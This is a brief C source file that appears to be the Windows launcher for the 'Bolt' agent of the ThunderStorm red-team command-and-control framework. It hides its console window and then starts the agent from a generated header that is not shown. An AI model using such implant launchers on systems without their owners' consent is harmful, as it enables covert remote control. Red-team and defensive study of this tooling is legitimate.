// ThunderStorm Bolt Agent Binary Runner
//  Wraps the Go archive and will control a Bolt Agent
//
// Execute to directly launch a Bolt.
//  Runs in process.

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#include <windows.h>

// Bolt Include (Generated before compile)
#include "bolt.h"

int main(int argc, char *argv[]) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, SW_HIDE);
    }
    boltAgent(argc);
    return 0;
}